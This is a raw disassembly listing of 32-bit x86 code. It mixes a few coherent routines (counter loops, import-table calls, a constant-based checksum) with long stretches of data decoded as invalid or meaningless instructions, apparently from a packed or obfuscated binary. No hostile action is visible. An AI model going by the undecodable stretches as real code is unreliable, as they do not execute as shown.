  40eae3:	cmp    DWORD PTR ds:0x433713,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433713,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433713
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433713,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433713
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433713,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433753,0x16
  40eb34:	cmp    DWORD PTR ds:0x433753,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433753,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433753
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433753,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433763,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43371b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4337ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    bl,BYTE PTR [eax]
  40ebb4:	clc    
  40ebb5:	repnz add DWORD PTR [edx+0x547e7ea5],ebx
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec26
  40ebc0:	lahf   
  40ebc1:	mov    eax,ds:0xa4d25bd5
  40ebc6:	inc    esp
  40ebc7:	pop    ebp
  40ebc8:	sub    al,0x7f
  40ebca:	jne    0x40eba7
  40ebcc:	shl    al,cl
  40ebce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebcf:	or     al,ah
  40ebd1:	xchg   ebx,eax
  40ebd2:	aam    0x59
  40ebd4:	mov    BYTE PTR [ebx+0x1ebbb611],dh
  40ebda:	mov    ebx,0xe2488a6a
  40ebdf:	pusha  
  40ebe0:	sbb    al,0x1c
  40ebe2:	sub    eax,0x3f50267d
  40ebe7:	jo     0x40eb7c
  40ebe9:	add    al,0x5f
  40ebeb:	inc    edx
  40ebec:	test   DWORD PTR [edx-0x30],ecx
  40ebef:	push   0xffffffcb
  40ebf1:	(bad)  
  40ebf2:	mov    bh,0xdb
  40ebf4:	and    al,0xfd
  40ebf6:	jbe    0x40ec15
  40ebf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebf9:	add    edx,DWORD PTR [esi]
  40ebfb:	ret    0xe07a
  40ebfe:	ins    DWORD PTR es:[edi],dx
  40ebff:	push   es
  40ec00:	outs   dx,BYTE PTR ds:[esi]
  40ec01:	ficom  WORD PTR [eax-0x409adac1]
  40ec07:	mov    esi,0x3b9da451
  40ec0c:	cmp    DWORD PTR [eax+0x26],esp
  40ec0f:	lds    eax,FWORD PTR [ecx-0x2099b70a]
  40ec15:	xlat   BYTE PTR ds:[bx]
  40ec17:	mov    eax,0xaa4e5f6c
  40ec1c:	fidiv  WORD PTR [ebx-0x80]
  40ec1f:	and    al,0xf6
  40ec21:	inc    ebp
  40ec22:	dec    edi
  40ec23:	and    dl,BYTE PTR [ecx]
  40ec25:	in     al,dx
  40ec26:	pop    ebp
  40ec27:	adc    dl,bl
  40ec29:	into   
  40ec2a:	shl    BYTE PTR [ebx+ecx*8],cl
  40ec2d:	pop    esp
  40ec2e:	(bad)  
  40ec2f:	sbb    al,0x88
  40ec31:	int3   
  40ec32:	xchg   esp,eax
  40ec34:	push   0x85bfa07d
  40ec39:	jecxz  0x40ec92
  40ec3b:	test   dl,0xd1
  40ec3e:	das    
  40ec3f:	or     al,0x83
  40ec41:	sti    
  40ec42:	mov    DWORD PTR [ebp+esi*1+0x59e04048],edx
  40ec49:	sbb    BYTE PTR [ecx+0x2561032],dh
  40ec4f:	xor    edi,edi
  40ec51:	pop    ebx
  40ec52:	(bad)  
  40ec53:	adc    eax,0x89591f30
  40ec58:	je     0x40ec9c
  40ec5a:	sub    edx,DWORD PTR [ecx]
  40ec5c:	jmp    0x40ec96
  40ec5e:	mov    cl,0xe5
  40ec60:	xchg   DWORD PTR [edx+0x20],ebx
  40ec63:	sbb    eax,0xe877dd13
  40ec68:	(bad)  
  40ec69:	cld    
  40ec6a:	mov    eax,ds:0xff57230b
  40ec6f:	dec    edi
  40ec70:	cmp    ebp,esi
  40ec72:	sbb    al,0xb
  40ec74:	sub    BYTE PTR [esp+ecx*8+0x9],ah
  40ec78:	mov    dh,0x4
  40ec7a:	outs   dx,DWORD PTR ds:[esi]
  40ec7b:	in     eax,0x60
  40ec7d:	jle    0x40ec51
  40ec7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec80:	loop   0x40ec26
  40ec82:	and    edi,ebp
  40ec84:	lods   al,BYTE PTR ss:[esi]
  40ec86:	xor    BYTE PTR [esi+0x26],cl
  40ec89:	(bad)  
  40ec8a:	push   ds
  40ec8b:	hlt    
  40ec8c:	js     0x40ec49
  40ec8e:	aad    0xe6
  40ec90:	lea    esi,[edx+0x15]
  40ec93:	jl     0x40ecd6
  40ec95:	in     eax,dx
  40ec96:	mov    edx,0xa5c134d
  40ec9b:	dec    edx
  40ec9c:	mov    esp,0x3403cc15
  40eca1:	mov    dl,0x69
  40eca3:	push   ebx
  40eca4:	inc    eax
  40eca5:	lock imul esi,DWORD PTR ds:0x9181ae48,0x437f5d6b
  40ecb0:	loop   0x40eccd
  40ecb2:	mov    eax,0x1c6927fd
  40ecb7:	push   es
  40ecb8:	in     eax,0x8a
  40ecba:	lods   al,BYTE PTR ds:[esi]
  40ecbb:	xor    DWORD PTR [ebp+edx*2-0x4cb29e9f],esi
  40ecc2:	lods   eax,DWORD PTR ds:[esi]
  40ecc3:	(bad)  
  40ecc4:	cli    
  40ecc5:	jge    0x40ecb9
  40ecc7:	and    BYTE PTR [esi+0x6b],ah
  40ecca:	jno    0x40ed31
  40eccc:	cmp    eax,0x30299b50
  40ecd1:	or     DWORD PTR [edi+0x21612dac],ecx
  40ecd7:	call   0xbecb:0x8574673d
  40ecde:	ja     0x40ecd8
  40ece0:	or     bh,dl
  40ece2:	or     al,0x7c
  40ece4:	rcl    BYTE PTR cs:[edx-0x11da4958],0xc1
  40ecec:	mov    eax,0xc20d89a7
  40ecf1:	xchg   edi,eax
  40ecf2:	jg     0x40ec7a
  40ecf4:	cmp    esi,DWORD PTR [ebx+0x3c]
  40ecf7:	push   edx
  40ecf8:	leave  
  40ecf9:	out    0x85,al
  40ecfb:	and    BYTE PTR [eax+edi*4-0x5f11960a],dl
  40ed02:	push   0xb3831934
  40ed07:	arpl   WORD PTR [edi],cx
  40ed09:	cwde   
  40ed0a:	pusha  
  40ed0b:	sbb    DWORD PTR [ecx],edx
  40ed0d:	jno    0x40ecc4
  40ed0f:	stos   DWORD PTR es:[edi],eax
  40ed10:	jb     0x40ed91
  40ed12:	xchg   ecx,eax
  40ed13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed14:	jnp    0x40ed93
  40ed16:	sbb    al,0xef
  40ed18:	ins    DWORD PTR es:[edi],dx
  40ed19:	sub    eax,0x99832a8c
  40ed1e:	sbb    dh,ch
  40ed20:	lods   al,BYTE PTR ds:[esi]
  40ed21:	xor    BYTE PTR [edi-0x54],al
  40ed24:	xchg   esi,eax
  40ed25:	retf   
  40ed26:	mov    ecx,0x71d1c1a0
  40ed2b:	mov    BYTE PTR [eax+0x673709d],bl
  40ed31:	or     eax,0x3db94a3
  40ed36:	xchg   DWORD PTR [edi],esi
  40ed38:	cs icebp 
  40ed3a:	fs gs push 0xffffffd1
  40ed3e:	pop    ss
  40ed3f:	mov    esp,DWORD PTR [edi]
  40ed41:	jmp    0xc312:0xd9f45749
  40ed48:	or     al,BYTE PTR [ebp+0x30]
  40ed4b:	jae    0x40ecd9
  40ed4d:	fwait
  40ed4e:	jg     0x40ed89
  40ed50:	mov    eax,0x5763b187
  40ed55:	das    
  40ed56:	and    DWORD PTR [ebx],esi
  40ed58:	and    esp,ecx
  40ed5a:	inc    edx
  40ed5b:	sbb    al,al
  40ed5d:	pop    esi
  40ed5e:	mov    cl,0x5e
  40ed60:	jmp    0x8bc4:0xe0bfcd70
  40ed67:	ja     0x40edac
  40ed69:	dec    esi
  40ed6a:	stos   DWORD PTR es:[edi],eax
  40ed6b:	xchg   ecx,ebp
  40ed6d:	mov    al,0xe8
  40ed6f:	das    
  40ed70:	jmp    0x52aa:0xff057909
  40ed77:	and    BYTE PTR [edi+0x4e],bh
  40ed7a:	call   0x6a12:0x45dc360d
  40ed81:	push   0x9279c6c4
  40ed86:	pop    ebp
  40ed87:	aad    0x66
  40ed89:	stc    
  40ed8a:	data16 jbe 0x40ed3a
  40ed8d:	(bad)  
  40ed8e:	fiadd  WORD PTR [ebx]
  40ed90:	push   edx
  40ed91:	imul   esp,edx,0xffffffd3
  40ed94:	repz es cs mov ebp,0x2bc233e5
  40ed9c:	or     eax,0x4336d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433753,0x18
  40edad:	cmp    DWORD PTR ds:0x433753,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433753,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433753
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433753,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x2321380]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	repnz aas 
  40ee78:	xlat   BYTE PTR ds:[ebx]
  40ee79:	xor    DWORD PTR [ebp+0x4],edi
  40ee7c:	push   0x433c4864
  40ee81:	aaa    
  40ee82:	push   eax
  40ee83:	xchg   BYTE PTR [ecx-0x51],bh
  40ee86:	sahf   
  40ee87:	(bad)  
  40ee88:	repnz and al,0xe4
  40ee8b:	push   edx
  40ee8c:	and    BYTE PTR [eax-0x22],0x95
  40ee90:	inc    ebp
  40ee91:	push   ds
  40ee92:	adc    ebx,DWORD PTR [ecx-0x784de5d2]
  40ee98:	dec    eax
  40ee99:	iret   
  40ee9a:	push   edx
  40ee9b:	aam    0xb9
  40ee9d:	mov    bh,0x82
  40ee9f:	std    
  40eea0:	mov    dl,0x50
  40eea2:	stos   BYTE PTR es:[edi],al
  40eea3:	ins    BYTE PTR es:[edi],dx
  40eea4:	mov    WORD PTR [ebx+0x7f8c20],?
  40eeaa:	fnsave [ebx]
  40eeac:	push   edi
  40eead:	sar    DWORD PTR [eax-0x11],1
  40eeb0:	ds je  0x40eecd
  40eeb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb4:	shr    BYTE PTR [ebx],0x7d
  40eeb7:	sbb    al,0x9
  40eeb9:	and    cl,BYTE PTR [ecx]
  40eebb:	mov    esp,0xbf7e662d
  40eec0:	rcr    BYTE PTR [bx+0x5dee],0x6b
  40eec6:	rcl    DWORD PTR [ecx-0x9],cl
  40eec9:	sar    BYTE PTR [ecx],1
  40eecb:	scas   eax,DWORD PTR es:[edi]
  40eecc:	xchg   DWORD PTR [ebp+0x25f5d285],ebx
  40eed2:	push   cs
  40eed3:	movlps xmm6,QWORD PTR [edi+0x27d5e978]
  40eeda:	fild   WORD PTR [ebp-0x68]
  40eedd:	xchg   edi,eax
  40eede:	jg     0x40ef00
  40eee0:	nop
  40eee1:	ror    ch,1
  40eee3:	add    eax,0xda9bc669
  40eee8:	cld    
  40eee9:	adc    cl,BYTE PTR [esi+0x7f25307d]
  40eeef:	push   esi
  40eef0:	imul   ebx,DWORD PTR [edx+0x47],0x4a
  40eef4:	push   eax
  40eef5:	ss inc ebp
  40eef7:	add    al,BYTE PTR [eax+0x4d1f7b0b]
  40eefd:	sahf   
  40eefe:	and    eax,0xac596d0a
  40ef03:	xchg   esp,eax
  40ef04:	in     eax,dx
  40ef05:	push   ebp
  40ef06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef07:	cmp    BYTE PTR [edx],dh
  40ef09:	xor    al,0x98
  40ef0b:	clc    
  40ef0c:	mov    al,ds:0xa0175209
  40ef11:	(bad)  
  40ef12:	(bad)  
  40ef13:	aam    0x5a
  40ef15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef16:	rcl    BYTE PTR [edx-0x790d50c8],0xcc
  40ef1d:	lods   al,BYTE PTR ds:[esi]
  40ef1e:	sbb    al,0x29
  40ef20:	xchg   ebx,eax
  40ef21:	and    al,0x37
  40ef23:	mov    DWORD PTR [ecx+0x2b994a4b],ecx
  40ef29:	ss scas eax,DWORD PTR es:[edi]
  40ef2b:	sbb    edx,DWORD PTR [eax-0x4cfa8ca3]
  40ef31:	jae    0x40ef0b
  40ef33:	pop    edx
  40ef34:	shl    bh,cl
  40ef36:	lods   eax,DWORD PTR ds:[esi]
  40ef37:	call   0xb219:0xa8f070e5
  40ef3e:	lds    ebp,FWORD PTR [ecx-0x14789934]
  40ef44:	std    
  40ef45:	cwde   
  40ef46:	cmp    eax,0x31a37066
  40ef4b:	call   0x5477966b
  40ef50:	dec    esi
  40ef51:	icebp  
  40ef52:	loop   0x40ef9d
  40ef54:	clc    
  40ef55:	and    eax,0x1b54a798
  40ef5a:	sbb    DWORD PTR [edx+0x29711fb3],esp
  40ef60:	inc    esp
  40ef61:	int3   
  40ef62:	les    ebp,FWORD PTR [edi+0x2189a26]
  40ef68:	sub    ah,BYTE PTR ds:0xd07aad44
  40ef6e:	or     edx,esp
  40ef70:	mov    DWORD PTR [edx-0x12],ecx
  40ef73:	call   FWORD PTR [edi+ecx*4]
  40ef76:	inc    esp
  40ef77:	daa    
  40ef78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef79:	(bad)  
  40ef7a:	outs   dx,WORD PTR ds:[esi]
  40ef7c:	aam    0x55
  40ef7e:	out    0xe,al
  40ef80:	mov    edi,0x417a9405
  40ef85:	adc    dl,BYTE PTR [ecx]
  40ef87:	cmc    
  40ef88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef89:	dec    ebx
  40ef8a:	adc    BYTE PTR [ebx-0xa],bl
  40ef8d:	mov    ebp,0x5741a72
  40ef92:	xchg   esp,eax
  40ef93:	push   ebx
  40ef94:	mov    fs,WORD PTR [ebp-0x3a]
  40ef97:	and    BYTE PTR [ebx+0x46],al
  40ef9a:	out    dx,eax
  40ef9b:	jle    0x40efc0
  40ef9d:	push   0xdeba840b
  40efa2:	ins    DWORD PTR es:[edi],dx
  40efa3:	call   0x3b4c16dc
  40efa8:	mov    ecx,0xbf5a825a
  40efad:	adc    edi,DWORD PTR [ecx+edi*2]
  40efb0:	sub    edx,DWORD PTR [eax-0x74]
  40efb3:	into   
  40efb4:	popf   
  40efb5:	or     eax,0x42f40b1b
  40efba:	fcom   QWORD PTR ds:0xe8546f60
  40efc0:	outs   dx,DWORD PTR ds:[esi]
  40efc1:	sub    BYTE PTR [edi],bh
  40efc3:	sub    dh,bh
  40efc5:	lods   al,BYTE PTR ds:[esi]
  40efc6:	and    DWORD PTR [edi+0x13],ecx
  40efc9:	lods   al,BYTE PTR ds:[esi]
  40efca:	cwde   
  40efcb:	js     0x40efc4
  40efcd:	pop    ecx
  40efce:	in     eax,0x3d
  40efd0:	jbe    0x40efa3
  40efd2:	fisttp QWORD PTR ds:[ecx]
  40efd5:	retf   0x2d70
  40efd8:	test   eax,0xa1a65cbb
  40efdd:	add    al,0x2a
  40efdf:	daa    
  40efe0:	xchg   edx,eax
  40efe1:	mov    ds:0xcffeea1e,al
  40efe6:	rol    DWORD PTR [ebp+0x37],cl
  40efe9:	sbb    DWORD PTR [ecx+0x79],ebp
  40efec:	aas    
  40efed:	dec    esp
  40efee:	jl     0x40effd
  40eff0:	mov    dl,0xa8
  40eff2:	jp     0x40f033
  40eff4:	jl     0x40ef7b
  40eff6:	(bad)  
  40eff8:	aad    0x1e
  40effa:	pop    es
  40effb:	(bad)  
  40effd:	mov    ebx,0x95b8ea42
  40f002:	arpl   WORD PTR ds:0xc5926494,cx
  40f008:	xchg   ebp,eax
  40f009:	jg     0x40f001
  40f00b:	in     al,dx
  40f00c:	and    ah,BYTE PTR [eax]
  40f00e:	or     BYTE PTR ds:0xb16c6992,bh
  40f014:	push   edi
  40f015:	stc    
  40f016:	out    dx,eax
  40f017:	or     al,0x99
  40f019:	pop    es
  40f01a:	sahf   
  40f01b:	int3   
  40f01c:	ja     0x40effb
  40f01e:	ins    DWORD PTR es:[edi],dx
  40f01f:	xor    DWORD PTR [eax-0x6c],eax
  40f022:	or     edx,DWORD PTR [esi-0x3]
  40f025:	push   ebp
  40f026:	call   0xd6eb:0x365be56c
  40f02d:	sub    BYTE PTR [edx+0xe0bbd02],0x6c
  40f034:	push   ecx
  40f035:	xor    cl,dh
  40f037:	in     eax,0x4f
  40f039:	xor    al,0x3
  40f03b:	dec    ebp
  40f03c:	add    dl,al
  40f03e:	jmp    0x40f04a
  40f040:	jge    0x40f080
  40f042:	adc    al,0x8b
  40f044:	mov    edx,0xc26f560e
  40f049:	mov    dl,0xf2
  40f04b:	imul   ebx,edx,0xfffffffe
  40f04e:	sub    al,0x7a
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43371b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x29b31594,ebx
  40f076:	cmp    al,0x9b
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cli    
  40f081:	lea    eax,[eax+0x59678afb]
  40f087:	add    DWORD PTR [ecx+0x1f],eax
  40f08a:	and    DWORD PTR [ebp-0x11],eax
  40f08d:	pop    ecx
  40f08e:	test   eax,0x248a6bf9
  40f093:	sbb    ebx,ebp
  40f095:	ds nop
  40f097:	cli    
  40f098:	shr    BYTE PTR [ecx-0x5ec1f737],cl
  40f09e:	and    al,0xf8
  40f0a0:	xchg   edi,eax
  40f0a1:	pop    edi
  40f0a2:	mov    edx,0x383dfecd
  40f0a7:	nop
  40f0a8:	outs   dx,DWORD PTR ds:[esi]
  40f0a9:	cdq    
  40f0aa:	sub    bl,al
  40f0ac:	cmp    BYTE PTR [edx+0x12],cl
  40f0af:	popa   
  40f0b0:	cld    
  40f0b1:	and    al,bl
  40f0b3:	mov    ah,0x2a
  40f0b5:	xor    al,0xee
  40f0b7:	cmp    al,0x7a
  40f0b9:	pop    ebp
  40f0ba:	repz out dx,al
  40f0bc:	inc    esp
  40f0bd:	sbb    DWORD PTR [edx+edi*8-0x677c5640],ebp
  40f0c4:	adc    eax,0x878bae30
  40f0c9:	sbb    BYTE PTR [edx+0x52],dl
  40f0cc:	xchg   ebx,eax
  40f0cd:	inc    edx
  40f0ce:	push   esp
  40f0cf:	mov    cl,0x66
  40f0d1:	mov    ds,WORD PTR [edx-0x14]
  40f0d4:	adc    ch,BYTE PTR [ebp+0x1dc326ec]
  40f0da:	lock jae 0x40f09c
  40f0dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0de:	or     DWORD PTR [eax],ebp
  40f0e0:	xor    bh,BYTE PTR [esi+ecx*1+0x214fae12]
  40f0e7:	bound  edx,QWORD PTR ds:0x92a2e496
  40f0ed:	push   eax
  40f0ee:	add    eax,0xe9965752
  40f0f3:	int3   
  40f0f4:	repz sub DWORD PTR [bx+di+0x1621],edi
  40f0fa:	mov    ebx,0x293bff36
  40f0ff:	cli    
  40f100:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f103:	inc    ebx
  40f104:	pop    ds
  40f105:	pop    ebx
  40f106:	cmc    
  40f107:	and    eax,ecx
  40f109:	(bad)  
  40f10a:	sbb    dh,bl
  40f10c:	and    dh,BYTE PTR [eax]
  40f10e:	dec    edi
  40f10f:	das    
  40f110:	jle    0x40f0a0
  40f112:	out    0xd0,al
  40f114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f115:	cmc    
  40f116:	sbb    eax,DWORD PTR [ecx-0x4]
  40f119:	sahf   
  40f11a:	inc    esi
  40f11b:	imul   eax,DWORD PTR [edi+0x36],0xffffff8d
  40f11f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f120:	arpl   WORD PTR [ecx-0x26dcdfee],di
  40f126:	pop    edi
  40f127:	add    ch,BYTE PTR [esi-0xa65109b]
  40f12d:	add    eax,0x83cd9fda
  40f132:	les    esp,FWORD PTR [ebx+0x42ed5f7b]
  40f138:	add    eax,0x2ad4e199
  40f13d:	data16 aad 0x22
  40f140:	or     ebx,DWORD PTR [ebx+0x5a032aa8]
  40f146:	test   ebp,ecx
  40f148:	sti    
  40f149:	inc    esi
  40f14a:	adc    eax,0xd6ef5fcf
  40f14f:	push   ebx
  40f150:	cmp    DWORD PTR [ebx],edx
  40f152:	in     al,0x41
  40f154:	(bad)  
  40f155:	xor    al,0xf2
  40f157:	cli    
  40f158:	xor    DWORD PTR [ebx+0x427362c5],ecx
  40f15e:	add    eax,0x5864b131
  40f163:	or     al,0x98
  40f165:	icebp  
  40f166:	pusha  
  40f167:	inc    ebp
  40f168:	mov    eax,ds:0x1631017d
  40f16d:	leave  
  40f16e:	popf   
  40f16f:	push   0xffffffdd
  40f171:	in     eax,0x60
  40f173:	lods   eax,DWORD PTR ds:[esi]
  40f174:	test   edi,esp
  40f176:	inc    edx
  40f177:	(bad)  
  40f178:	mov    dl,0xd8
  40f17a:	sbb    al,0x3
  40f17c:	inc    edi
  40f17d:	shr    DWORD PTR [ebx-0x63],cl
  40f180:	clc    
  40f181:	sub    DWORD PTR [edi],0x71
  40f184:	or     bl,BYTE PTR [edi-0x44cb39a5]
  40f18a:	imul   ebx,ebx,0xa9ddea3d
  40f190:	(bad)  
  40f191:	int3   
  40f192:	test   eax,0xdb293a5
  40f197:	stos   DWORD PTR es:[edi],eax
  40f198:	mov    ah,0xf1
  40f19a:	xor    al,BYTE PTR [eax]
  40f19c:	out    dx,eax
  40f19d:	push   eax
  40f19e:	loopne 0x40f1d7
  40f1a0:	gs add al,bh
  40f1a3:	inc    bp
  40f1a5:	and    ebx,DWORD PTR [ebx-0x4d]
  40f1a8:	add    ch,BYTE PTR [ebx+0x3e]
  40f1ab:	add    DWORD PTR [ecx],ebp
  40f1ad:	aam    0xee
  40f1af:	retf   0x2348
  40f1b2:	aam    0x7b
  40f1b4:	cld    
  40f1b5:	mov    ebx,0x8c9c1861
  40f1ba:	mov    ds:0x74040c4,eax
  40f1bf:	and    BYTE PTR ds:0x867675bd,cl
  40f1c5:	es call 0x94683396
  40f1cb:	pop    edx
  40f1cc:	xor    DWORD PTR [edi+0x23e8e705],edi
  40f1d2:	ds add eax,0xe15025e9
  40f1d8:	mov    eax,ds:0x4119db
  40f1dd:	outs   dx,DWORD PTR ds:[esi]
  40f1de:	in     eax,dx
  40f1df:	mov    ebp,0x6ceb68b3
  40f1e4:	or     ecx,DWORD PTR [ebp+0x47091b68]
  40f1ea:	js     0x40f25b
  40f1ec:	das    
  40f1ed:	lock xor edx,ecx
  40f1f0:	mov    eax,ds:0xe7c77fe2
  40f1f5:	in     eax,0x86
  40f1f7:	jg     0x40f1c3
  40f1f9:	mov    bh,0x1b
  40f1fb:	out    dx,al
  40f1fc:	fbld   TBYTE PTR [eax]
  40f1fe:	xchg   esi,eax
  40f1ff:	popf   
  40f200:	dec    esi
  40f201:	xchg   esi,eax
  40f202:	dec    ebp
  40f203:	mov    ds:0xf0f92497,al
  40f208:	es loop 0x40f1ae
  40f20b:	inc    edx
  40f20c:	dec    esp
  40f20d:	(bad)  
  40f20e:	inc    ecx
  40f20f:	pop    es
  40f210:	(bad)  
  40f211:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40f213:	or     bl,BYTE PTR [edx-0xb]
  40f216:	jb     0x40f19d
  40f218:	lods   eax,DWORD PTR ds:[esi]
  40f219:	fst    DWORD PTR [eax]
  40f21b:	mov    ebx,0xc0d2126d
  40f220:	sbb    esi,edx
  40f222:	xchg   edi,eax
  40f223:	mov    dl,0xc8
  40f225:	push   ecx
  40f226:	xchg   edx,eax
  40f227:	pop    esi
  40f228:	addr16 retf 
  40f22a:	cmp    al,0xd4
  40f22c:	push   0x32
  40f22e:	and    eax,0xbfcfbd37
  40f233:	(bad)  
  40f234:	xchg   ecx,eax
  40f235:	xchg   ecx,eax
  40f236:	scas   eax,DWORD PTR es:[edi]
  40f237:	loopne 0x40f1c4
  40f239:	arpl   WORD PTR ds:0xcdc5ef38,cx
  40f23f:	mov    WORD PTR [edi],fs
  40f241:	mov    dl,0xd7
  40f243:	sbb    DWORD PTR [ecx],edx
  40f245:	rol    DWORD PTR [ebx],0xb1
  40f248:	mov    esp,0xae1ce889
  40f24d:	or     ecx,DWORD PTR [ebx]
  40f24f:	not    DWORD PTR [edx-0x73]
  40f252:	dec    esp
  40f253:	mov    edx,gs
  40f255:	call   0xbc755081
  40f25a:	jmp    FWORD PTR [ebp-0x2e]
  40f25d:	add    eax,0x7c4b830f
  40f262:	xchg   esp,eax
  40f263:	add    dh,BYTE PTR [edi+0x3f]
  40f266:	push   esi
  40f267:	cdq    
  40f268:	stos   DWORD PTR es:[edi],eax
  40f269:	dec    ecx
  40f26a:	mov    esp,0xa3ae1d0e
  40f26f:	mov    edx,0xe9362378
  40f274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f275:	sub    DWORD PTR [ecx+ecx*2],ebp
  40f278:	mov    al,BYTE PTR [edx-0x17]
  40f27b:	mov    bh,0x61
  40f27d:	call   0xbf689adb
  40f282:	and    eax,0x5d9bfbd1
  40f287:	aad    0x77
  40f289:	pop    ebx
  40f28a:	rol    BYTE PTR [ecx+0x22fc660d],cl
  40f290:	mov    dh,0x7
  40f292:	in     eax,0x93
  40f294:	mov    eax,ds:0x438a5581
  40f299:	jb     0x40f2aa
  40f29b:	push   edx
  40f29c:	(bad)  
  40f29e:	addr16 mov ebx,0x842c7684
  40f2a4:	aas    
  40f2a5:	ins    BYTE PTR es:[edi],dx
  40f2a6:	mov    ch,0x9
  40f2a8:	loopne 0x40f2ff
  40f2aa:	in     eax,dx
  40f2ab:	retf   
  40f2ac:	cmp    al,BYTE PTR [ecx-0x31366156]
  40f2b2:	(bad)  
  40f2b4:	pop    es
  40f2b5:	retf   0xce0a
  40f2b8:	imul   esp,DWORD PTR [ebp-0x1e],0x8f1f21e5
  40f2bf:	popf   
